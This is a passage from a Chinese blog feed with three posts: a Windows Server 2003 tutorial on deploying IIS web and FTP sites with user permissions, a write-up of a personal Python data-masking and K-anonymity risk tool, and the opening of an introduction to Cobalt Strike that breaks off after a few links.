id="11-服务器对域名请求的处理顺序"><a href="#11-服务器对域名请求的处理顺序" class="headerlink" title="11.服务器对域名请求的处理顺序"></a>11.服务器对域名请求的处理顺序</h2><p>1.服务器中的DNS高速缓存–2.本地区域解析文件–3.转发器–4.根</p><hr><h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><ul><li><p>web服务器一般也称为:网页服务器、HTTP服务器</p></li><li><p>web服务器是将我们做好的网站通过网络发布出去，让网民通过网络可以远程访问我的网页！比如京东网站服务器、百度web服务器等等</p></li><li><p>web服务器使用的协议是http协议，现在也有https协议了，更加安全</p></li><li><p>HTTP协议端口号：80</p></li><li><p>常用的web中间件(发布web服务器的软件)：</p><ul><li>微软：IIS（IIS软件可以发布web服务器、发布FTP服务器）</li><li>linux：Apache/LAMP/LNMP/Tomcat/Nginx等</li><li>第三方：phpstudy、XAMPP</li></ul></li></ul><h2 id="部署WEB服务器"><a href="#部署WEB服务器" class="headerlink" title="部署WEB服务器"></a>部署WEB服务器</h2><h3 id="1）安装IIS"><a href="#1）安装IIS" class="headerlink" title="1）安装IIS"></a>1）安装IIS</h3><p>在win server 2003中同样安装windows 组件，双击”应用程序服务器”–&gt;双击”Internet 信息服务(IIS)”–&gt;打钩”万维网服务”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130302552.png" alt="image-20220613030259314"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130303505.png" alt="image-20220613030325331"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130303433.png" alt="image-20220613030353284"></p><p>安装完成之后依旧可以在开始菜单中的管理工具看到</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130314332.png" alt="image-20220613031403128"></p><p>使用<code>netstat -an</code>查看<strong>80</strong>端口是否已经打开</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130306514.png" alt="image-20220613030621333"></p><h3 id="2）默认网站"><a href="#2）默认网站" class="headerlink" title="2）默认网站"></a>2）默认网站</h3><p>但是此时此刻还没有制作网页，但是IIS自带了一个已经发布好的网站，称之为默认网站，打开IIS管理器–&gt;网站–&gt;默认网站中查看</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130323152.png" alt="image-20220613032324970"></p><p>该网站的内容是”建设中…”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130309611.png" alt="image-20220613030905508"></p><p>默认网站的路径是c:\Inetpub\wwwroot，当员工访问该IP的网页时，会在该路径下寻找网页</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130328022.png" alt="image-20220613032813758"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130329077.png" alt="image-20220613032945926"></p><p>此时建议停止默认网站，因为默认网站存在巨大漏洞！</p><p>右键”默认网站”–&gt;停止</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130331527.png" alt="image-20220613033112412"></p><p>停止之后，80端口就会自动关闭，因为停止默认网站之后对外已经没有开放任何的网站了，这是IIS的独特之处</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130332830.png" alt="image-20220613033210632"></p><h3 id="3）制作网站1"><a href="#3）制作网站1" class="headerlink" title="3）制作网站1"></a>3）制作网站1</h3><p>制作网站的主要步骤有两个：</p><ul><li>新建网站(发布网站)，在网站右键–&gt;新建网站即可</li><li>设置默认文档，如baidu网站–&gt;右键属性–&gt;文档–&gt;添加首页</li></ul><p>随便在某个盘(不建议在桌面或者是C盘上)，比如E盘新建一个文件夹专门用来存放某种类型(比如baidu)的网站，然后总共有两个站点，一个是baidu.html(当作主站点)，一个是nba.html(当作副站点)，主站点可点击超链接访问副站点(这个超链接是相对路径)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130339077.png" alt="image-20220613033958945"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130340138.png" alt="image-20220613034056048"></p><p>编辑好以后，可以直接双击文件先本地访问主站点</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130341812.png" alt="image-20220613034121729"></p><p>点击”NBA”超链接之后跳转到nba.html</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130341702.png" alt="image-20220613034152546"></p><p>检查好以后，新建网站发布</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130342983.png" alt="image-20220613034255874"></p><p>首先输入网站的描述，用来辨识</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130343651.png" alt="image-20220613034343537"></p><p>然后填写IP地址和网站的端口号</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130344881.png" alt="image-20220613034451742"></p><p>然后网站主目录指向刚才新建的装有站点的文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130345621.png" alt="image-20220613034520442"></p><p>网站访问权限建议只允许”读取”，不要给过多权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130346523.png" alt="image-20220613034610415"></p><p>完成以后，可以看到baidu网站已经创建好了，但是还不能够成功访问内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130350879.png" alt="image-20220613035024758"></p><p>因为还没设置首页，右键”baidu”–&gt;属性</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130347963.png" alt="image-20220613034757781"></p><p>然后选择文档，在默认的内容页中，删除其他的默认页，添加刚才的主站点的名字，即baidu.html</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130348990.png" alt="image-20220613034842844"></p><p>这时候，baidu.html就变成80端口的首页了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130350130.png" alt="image-20220613035049028"></p><h3 id="4）制作网站2"><a href="#4）制作网站2" class="headerlink" title="4）制作网站2"></a>4）制作网站2</h3><h4 id="不同端口"><a href="#不同端口" class="headerlink" title="不同端口"></a>不同端口</h4><p>假如在E盘新建文件夹”hr”，创建文件hr.html</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131627493.png" alt="image-20220613162722365"></p><p>所以现在有两套不同类型的web网站</p><p>所以需要部署到不同的端口上</p><p>还是一样的步骤</p><ul><li>新建网站(发布网站)，在网站右键–&gt;新建网站即可</li><li>设置默认文档，hr网站–&gt;右键属性–&gt;文档–&gt;添加首页</li></ul><p>在第一步新建网站的过程中，绑定端口号的时候需要修改成除了baidu的80端口的其它端口号，否则再启动该站点的时候会报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131631449.png" alt="image-20220613163142337"></p><p>所以需要修改端口号，也可以创建完成之后右键站点–&gt;属性–&gt;网站，可以修改端口号，这里改成81</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131633946.png" alt="image-20220613163331793"></p><p>这时候再用<code>netstat -an</code>查看端口号，发现81端口也打开了，说明hr站点服务已经启动成功</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131634407.png" alt="image-20220613163409255"></p><p>在浏览器中访问 </p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131634650.png" alt="image-20220613163442535"></p><p><strong>PS：但是该方法一般都是专业人士来使用，因为一般用户不会特地去输入端口号。一般都是测试人员来使用不同端口号，比如8080端口号很多人用来放测试网站，来对刚敲好的网站进行测试</strong></p><h4 id="不同域名"><a href="#不同域名" class="headerlink" title="不同域名"></a>不同域名</h4><p>还有一种办法就是使用不同的域名发布不同的网站，这个适合更多的普通用户。右键baidu站点–&gt;属性–&gt;网站–&gt;高级</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131641284.png" alt="image-20220613164144121"></p><p>点击之后出现”高级网站标识”，可以看到IP地址和TCP端口绑定的组合，说明访问”10.1.1.2:80”就可以访问web网站</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131642102.png" alt="image-20220613164244964"></p><p>这时候点击”编辑”按钮，主机头值就是完整的域名，把”<a href="http://www.baidu.com&quot;填进去，以后输入这个域名就会默认访问到&quot;10.1.1.2:80&quot;了">www.baidu.com&quot;填进去，以后输入这个域名就会默认访问到&quot;10.1.1.2:80&quot;了</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131645303.png" alt="image-20220613164524160"></p><p>点击”确定”后就可以看到主机头值被设置了，以后用户访问该网站必须满足这三个条件，<strong>意思就是必须访问域名”<a href="http://www.baidu.com&quot;，然后通过域名解析成&quot;10.1.1.2:80&quot;才可访问到该网站的网页，如果直接跳过域名输入&quot;10.1.1.2:80&quot;是不可访问的">www.baidu.com&quot;，然后通过域名解析成&quot;10.1.1.2:80&quot;才可访问到该网站的网页，如果直接跳过域名输入&quot;10.1.1.2:80&quot;是不可访问的</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131646656.png" alt="image-20220613164620519"></p><p>然后hr站点也设置主机头值，<strong>这时候可以是同一个端口号了</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131656906.png" alt="image-20220613165643757"></p><p>然后访问IP地址是不可以的，只能访问域名</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131657906.png" alt="image-20220613165733798"></p><p>而访问域名之前记得 部署好DNS服务器，就可以访问了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131658261.png" alt="image-20220613165809104"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131658935.png" alt="image-20220613165817805"></p><p>这种方法普遍使用，比如说京东，这里使用<code>nslookup www.jd.com</code>来看一下京东的公网IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131838384.png" alt="image-20220613183808258"></p><p>然后在浏览器网址栏上输入京东的IP地址，这时候请求会被拒绝，并且地址栏显示我们的环回地址127.0.0.1</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131839602.png" alt="image-20220613183925493"></p><p>说明可以用域名访问京东，但是不能用IP地址访问</p><h1 id="网站类型"><a href="#网站类型" class="headerlink" title="网站类型"></a>网站类型</h1><h2 id="1-静态网站"><a href="#1-静态网站" class="headerlink" title="1.静态网站"></a>1.静态网站</h2><p>不能与用户进行互动，即没有交互，最多只有超链接，超链接是静态网站之间的互动。一般扩展名为”.html”或者”.htm”</p><p>只有前台页面，没有后台数据库</p><h2 id="2-动态网站"><a href="#2-动态网站" class="headerlink" title="2.动态网站"></a>2.动态网站</h2><p>可以与客户进行互动，可以输入，登录等，动态网页在html静态页面的基础上内置了动态语言。</p><p>动态语言的作用：连接前台页面与后台数据库</p><p>动态语言：php、asp、jsp、java、python</p><p>而扩展名，如果是php编写的动态网页扩展名为”.php”，以此类推”.asp”、”jsp”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131937150.png" alt="image-20220613193753019"></p><h3 id="发布动态网站"><a href="#发布动态网站" class="headerlink" title="发布动态网站"></a>发布动态网站</h3><p>如果扩展名为”.asp”则需要启用asp语言</p><p>而asp语言是微软开发的，所以：</p><ul><li><p>如果扩展名为”asp”的页面建议用windows服务器发布网站：IIS+ASP+SQL Server (IIS中间件、ASP动态语言、SQL Server数据库，都是微软自己开发的)</p></li><li><p>而如果扩展名为”php”的页面建议用linux服务器发布网站：Apache+PHP+MYSQL (这个组合其实就是LAMP)</p></li></ul><p>案例：</p><p>有asp类型的网站框架需要发布，文件夹名为”933h”，首先像发布静态网站一样右键网站–&gt;新建–&gt;网站，填写描述和IP地址以及端口号之后选择框架的文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140102389.png" alt="image-20220614010240196"></p><p> 在”网站访问权限”步骤的时候，允许”读取”、”运行脚本”和”执行”权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140105168.png" alt="image-20220614010522034"></p><p> 完成之后设置默认网站，该框架的默认网站的文件名叫”index.asp”，常用的默认网页就是”index”和”default”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140106936.png" alt="image-20220614010658790"></p><p>应用并确定后，允许asp的web服务扩展，即允许asp语言在别人访问网站时连接后台数据库</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140109893.png" alt="image-20220614010921757"></p><p>然后就可以访问该动态网站了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140111504.png" alt="image-20220614011141384"></p><p>并且可以输入信息提交到数据库中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140112590.png" alt="image-20220614011208431"></p><h1 id="FTP服务器"><a href="#FTP服务器" class="headerlink" title="FTP服务器"></a>FTP服务器</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>File Transfor Protocol === 文件传输服务器</p><p>FTP服务器功能几乎等于445文件共享服务器(SMB)</p><p>一般情况下：</p><ul><li>内部文件共享使用SMB(微软开发)服务器</li><li>对外文件共享使用FTP(全球通用)服务器</li></ul><h2 id="2-FTP协议"><a href="#2-FTP协议" class="headerlink" title="2.FTP协议"></a>2.FTP协议</h2><p>两个端口：20/21</p><p>20端口：数据端口(传输数据)，20端口号默认关闭，在用户上传下载文件的时候打开，上传下载完成后再次关闭</p><p>21端口：控制端口(初步访问)，21端口号会一直打开，让用户进行登录操作和浏览操作</p><p>FTP协议有两种连接模式：</p><ul><li>主动模式</li><li>被动模式</li></ul><h2 id="3-使用IIS部署FTP服务器"><a href="#3-使用IIS部署FTP服务器" class="headerlink" title="3.使用IIS部署FTP服务器"></a>3.使用IIS部署FTP服务器</h2><h3 id="1）安装组件"><a href="#1）安装组件" class="headerlink" title="1）安装组件"></a>1）安装组件</h3><p>在IP为10.1.1.2的win server 2003中安装组件，双击”应用程序服务器”–&gt;双击”Internet 信息服务(IIS)”–&gt;打钩”文件传输协议(FTP)服务”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140132704.png" alt="image-20220614013235484"></p><p>安装完成后，使用<code>netstat -an</code>查看21端口号是否已经打开(记住，20端口号默认不打开，只有在传输数据的时候临时打开)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140134317.png" alt="image-20220614013419060"></p><p>而如果把唯一的FTP站点关闭，21端口也会关闭，这时候就代表win server 2003不再是FTP服务器</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140153331.png" alt="image-20220614015330195"></p><h3 id="2）默认FTP站点"><a href="#2）默认FTP站点" class="headerlink" title="2）默认FTP站点"></a>2）默认FTP站点</h3><p>打开IIS服务页面后，可以看到有一个默认FTP站点，和WEB服务一样，默认已经对外发布了该文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140136395.png" alt="image-20220614013629224"></p><p>因为该默认FTP站点也有漏洞，所以停止该默认FTP站点</p><h3 id="3）新建FTP站点"><a href="#3）新建FTP站点" class="headerlink" title="3）新建FTP站点"></a>3）新建FTP站点</h3><p>然后在E盘下新建一个文件夹”movie”，并放入文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140156175.png" alt="image-20220614015613061"></p><p>然后右键”FTP站点”–&gt;新建–&gt;FTP站点</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140156259.png" alt="image-20220614015650149"></p><p>填入描述、IP地址和端口号之后，FTP站点主目录选择刚才新建的文件夹”movie”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140157589.png" alt="image-20220614015754424"></p><p>点击”下一步”，在”FTP站点访问权限”的步骤时，把”读取”和”写入”都勾上</p><p><strong>这时候客户机的权限取决于设置的NTFS的权限，因为用户的最终权限为FTP权限和NTFS权限的交集</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140159211.png" alt="image-20220614015906072"></p><h3 id="4）匿名登录"><a href="#4）匿名登录" class="headerlink" title="4）匿名登录"></a>4）匿名登录</h3><p>为了让客户机访问该文件夹的时候需要弹出弹框提示登录用户名和密码，右键”默认FTP站点”–&gt;属性</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140200440.png" alt="image-20220614020029322"></p><p>选择”安全账户”选项，可以看到”允许匿名连接”已经被勾上了，而且IIS默认创建了一个<strong>匿名账户</strong>：IUSR_计算机名</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140201387.png" alt="image-20220614020142237"></p><p>可以右键”我的电脑”–&gt;管理–&gt;本地用户和组–&gt;用户中查看到该匿名账户，这个匿名账户仅有访问的权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140147485.png" alt="image-20220614014712306"></p><p>在客户机访问的过程中，FTP服务器会返回这个匿名账户和密码给客户机，以此来让客户机登录该账户进行FTP的访问，实际上客户机已经输入了密码并且登录到该匿名账户来访问FTP服务器了，所以<strong>访问FTP服务器是必须要账号的</strong></p><p>把”允许匿名连接”的勾去掉并确定</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140201174.png" alt="image-20220614020111003"></p><h3 id="5）创建用户并验证"><a href="#5）创建用户并验证" class="headerlink" title="5）创建用户并验证"></a>5）创建用户并验证</h3><p>然后在win server 2003中新建三个账号</p><ul><li>a用户：只允许下载文件</li><li>b用户：只允许上传文件</li><li>c用户：完全控制权限</li></ul><p>然后设置权限，右键”movie”文件夹–&gt;属性–&gt;高级</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140205148.png" alt="image-20220614020521937"></p><p>取消权限的继承，并且保留以前的权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140206906.png" alt="image-20220614020647726"></p><p>然后除了Administrators组，其他用户与组全部删除，并添加a、b、c用户，而a用户具有读取权限(就是下载权限)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140208966.png" alt="image-20220614020814810"></p><p>b用户允许写入(即上传权限)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140209524.png" alt="image-20220614020900379"></p><p>c用户具有完全控制权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140209310.png" alt="image-20220614020953173"></p><p>这时候点击客户机(这里是windows xp)桌面上的”我的电脑”，在上面的地址栏上输入<code>ftp://10.1.1.2</code>就可以访问该文件夹了</p><p>因为不允许匿名登录，所以需要输入用户名和密码，这里使用a账户登录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140211541.png" alt="image-20220614021116388"></p><p>登录成功以后就可以看到刚才在FTP服务器的”movie”文件夹中创建的两个文件了，并且可以拷贝到桌面上</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140212357.png" alt="image-20220614021218200"></p><p>而如果要上传文件或者删除文件，则会报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140212371.png" alt="image-20220614021242248"></p><p>切换到b用户</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140213362.png" alt="image-20220614021307205"></p><p>输入b用户的账号密码之后，就可以看到刚才在FTP服务器的”movie”文件夹中创建的两个文件了</p><p>可以从桌面上传文件到FTP服务器</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140214362.png" alt="image-20220614021443213"></p><p>尝试把文件拖到桌面上(下载)或者删除文件，会报错</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140214879.png" alt="image-20220614021411764"></p><p>切换到c账户，可以随意上传、下载、删除里面的文件了，因为c账户具有完全控制权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140215331.png" alt="image-20220614021556183"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140216576.png" alt="image-20220614021616454"></p>]]></content>
    
    
    <summary type="html">Windows Server的各种服务/漏洞</summary>
    
    
    
    <category term="Windows" scheme="https://jason177.com/categories/Windows/"/>
    
    
    <category term="Windows" scheme="https://jason177.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>轻量的数据脱敏工具</title>
    <link href="https://jason177.com/2022/03/20/helpby/"/>
    <id>https://jason177.com/2022/03/20/helpby/</id>
    <published>2022-03-20T05:35:06.000Z</published>
    <updated>2022-05-03T07:31:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数据脱敏工具3-0新版"><a href="#数据脱敏工具3-0新版" class="headerlink" title="数据脱敏工具3.0新版"></a>数据脱敏工具3.0新版</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>Python环境：3.8 </p><p>本次版本修复了一些小bug，然后提供了扩展框(数据查询与删除)最后会讲</p><p>所需Python包在下载链接的Requirements.txt文件中，导入即可</p><p>更新版本时间：2022/5/3</p></div><div class="note success disabled"><p>链接：链接：<a href="https://pan.baidu.com/s/1xMf3o-P5Hv6T6uYViO_2_A">https://pan.baidu.com/s/1xMf3o-P5Hv6T6uYViO_2_A</a>    提取码：iksy</p></div><p>这是一款自己制作的轻量、便捷、面向个人用户的数据脱敏小工具，现在还不足以媲美市场上用于商业化的数据脱敏工具，但是后期会逐步完善~</p><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><p>首先需要确保自己的Python环境是3.8，然后在Python环境中安装该工具需要的包，在环境中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>不过这里还是要说一下：本次版本对比先前一次的版本，这次新导入了支持Excel表格的openpyxl库(这一步不需要操作，只是想要解释一下新导入的库)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031711624.png" alt="image-20220403171105517"></p><p>通过requirements.py文件导入好python库之后，使用Python.exe打开py后缀的文件即可出现该工具的页面(现在还没有打开需要脱敏的数据文件，所以看起来比较简洁…)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031715944.jpg" alt="img"></p><p>然后中间有四个选项：打开数据集1、打开数据集2、不设置数据集2、保存文件。我们需要导入两个数据集文件，一个充当身份数据集，是自己目前持有的数据集；一个充当公开数据集，是已经公布或者被发现的。而如果只是想要脱敏或者评估一张普通的表，则只需要把同一张表导入两次就可以了，因为公开数据集和身份数据集永远是包含或者相等关系，两张数据集只是为了计算对重标识的风险评估。**可以不点击”打开数据集2”，而是点击”不设置数据集2”**。这样就会弹出选项框，点击确定之后就会把数据集1也当成数据集2来使用。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031717005.png" alt="img"></p><p>导入文件后的页面是这样的(请注意，图中的身份证、手机号和姓名都是自己编造的假数据，请勿乱使用！)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031718608.png" alt="image-20220403171829493"></p><p>接下来，我们可以看到右边有可自定义设置的6个参数：脱敏的下标、脱敏的字符个数、阈值、K值、第二属性、α值。还有8个功能按钮：简单脱敏、初始化、查看图形、数据乱序、查看帮助、一键脱敏、一次评估、二次评估。</p><p>简单脱敏的功能就是可以对姓名、电话(目前只是支持对这两个属性进行简单脱敏，如果没有检测到的话就不会脱敏，检测机制即是对文件属性的名称做一个简单的判定，如果属性名称疑似，则通过简单的脱敏规则进行脱敏)进行一个简单的脱敏过程，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031719987.png" alt="image-20220403171906908"></p><p>进行了简单的脱敏之后，我们可以开始进入正题了：对身份证进行自定义脱敏。可以看到工具右边可以设置的参数：脱敏的下标和脱敏的个数</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201400826.png" alt="image-20220320140023780"></p><p>这里设置需要有限制：在设置的时候，要求脱敏的起始下标、脱敏的个数相加不大于身份证的个数，否则提示“超过了身份证长度”；脱敏的个数不大于9(身份证个数的一半)，否则提示“过度脱敏”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201401468.png" alt="image-20220320140117428"></p><p>当设置完这两个参数之后点击”一键脱敏”即可对身份证进行自定义的脱敏</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031720825.png" alt="image-20220403172001705"></p><p>可以看到左边的表中已经更新了当前数据集的状态，身份证已经从下标10开始往后脱敏8个数。如果脱敏效果不理想，重复刚才的步骤即可。设置完之后，可以看到脱敏阈值的输入框，我们一般有三个参考值：阈值为0.05时属于高度侵犯隐私，阈值为0.075时属于中度侵犯隐私，阈值为0.1时属于低度侵犯隐私，用户可以自由、灵活地选择，阈值越高说明对数据隐私的冗余性越高，阈值越低说明对数据隐私的要求越高。比如这里我们设置0.05，然后点击”一次评估”，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031720042.png" alt="image-20220403172045966"></p><p>可以看到数据集中身份证的等价类(等价类的意思就是几条数据中的某个属性，这个工具中的属性指的是身份证，如果相同的话就说明这几个身份证属于一个等价类)数量、重标识风险评估的结果都显示在右下角的文本框中。如果对评估结果不满意，可以重复以上流程。然后如果我们想要提高等价类的最小值，则可以定义K值。K值是基于K-匿名算法来定义的，如果数据集中的等价类最小值为2，则K=2。意思就是K值是一个数据集中等价类的最小值，K是该数据集的等价类标准。可以从上图看到第一个表中身份证的等价类最小值为2，如果我们定义K值，把K值设置成4，点击”二次评估”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031722584.png" alt="image-20220403172211469"></p><p>可以看到表中添加了假数据使表中的等价类最小值达到K值的标准。刚刚表中低于K值的等价类也都提高到了K的值，即等价类为4。然后通过第二次评估出来的结果，我们可以看到通过定义K的值，是可以降低表中的身份证被重标识的风险概率的。如果还不够直观，我们可以通过右上角的按钮”查看图形”来知道第一次评估和第二次评估的结果有何不同。<strong>红色代表第一次评估，蓝色代表第二次评估</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031722526.png" alt="image-20220403172238449"></p><p>而在第二次评估中我们不仅可以定义K值，还可以定义第二属性、α值。其中，K值可以单独定义，第二属性、α值也可以单独定义，但是第二属性和α值必须同时定义，比如不能只定义第二属性但是不定义α值，或者不能只定义α值不定义第二属性。然后K值、第二属性、α值可以同时三个一起定义。其原理跟设置身份证的K值差不多，定义第二属性对应定义身份证，定义α值对应定义K值，即：让表中第二属性的等价类达到α值的标准，这里我们假装设置电话为第二属性，我们在定义第二属性的框中输入属性名称：姓名，然后在α值中填入3，即表示表中第二属性的等价类最低也要达到3个数量</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031723209.png" alt="image-20220403172331121"></p><p>可以看到左边的表中添加了几条数据，右下角中的文本框后面追加了在增加数据之后第二属性的等价类相关信息，所有原本低于α值的等价类数量都达到了3。然后被重标识的风险也比之前低了很多，足以说明设置第二属性更加可以对我们的数据带来进一步的保护。如果我们在最后的结果中还是感到不满意，想要重新设置，点击右上角的”初始化”即可一键清空所有设置的参数，CSV数据集也可以重新导入。而右上角还提供了对数据进行一个乱序的效果，即把数据集中的数据全都打乱，这样假数据和真数据都混合在了一起，可以达到一个数据混淆的作用</p><p>下图是乱序前</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201439205.png" alt="image-20220320143930155"></p><p>下图是乱序后</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201439912.png" alt="image-20220320143955834"></p><p>点击”保存文件”按钮，然后选择文件路径及名称，即可保存脱敏后的数据集文件啦</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202204031735363.png" alt="image-20220403173524302"></p><p>扩展框点击之后，根据提示查询某些内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205031843759.png" alt="image-20220503184346631"></p><p>根据列名和查询的内容可以查到相关信息，然后可以点击某一项数据，再点击”删除选中数据”的按钮可删除数据</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205031845085.png" alt="image-20220503184514021"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205031845015.png" alt="image-20220503184526964"></p><p>前面的序号是在全部数据中的排列序号。再点击”显示全部”就能显示删除后的全部数据了(并且重新对数据进行排序，为了方便看到表中有多少行)。在显示全部数据的时候也可点击某行数据进行删除，这里不再赘述。</p><p>如果还想要了解该工具的更多内容，记得添加我的QQ或者发邮件给我喔~</p>]]></content>
    
    
    <summary type="html">自己制作的Python小工具</summary>
    
    
    
    <category term="我的工具" scheme="https://jason177.com/categories/%E6%88%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Python" scheme="https://jason177.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>cs</title>
    <link href="https://jason177.com/2022/03/06/cs/"/>
    <id>https://jason177.com/2022/03/06/cs/</id>
    <published>2022-03-06T04:47:35.000Z</published>
    <updated>2022-03-06T09:38:52.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>伟大的CS作为业界的 <del>枪战游戏</del> 渗透工具可谓是赫赫有名，所以水文章的话肯定是要拿CS(Cobalt Strike)来水一篇的</p><h1 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h1><p>Cobalt Strike是由美国Red Team开发，官网地址：<a href="http://cobaltstrike.com/">http://cobaltstrike.com</a></p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端(Client)与服务端(Teamserver)，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5/">Cobalt Strike B站参考链接</a></p><p><a href="https://zhuanlan.zhihu.com/p/93718885">安装教程</a></p><p><a 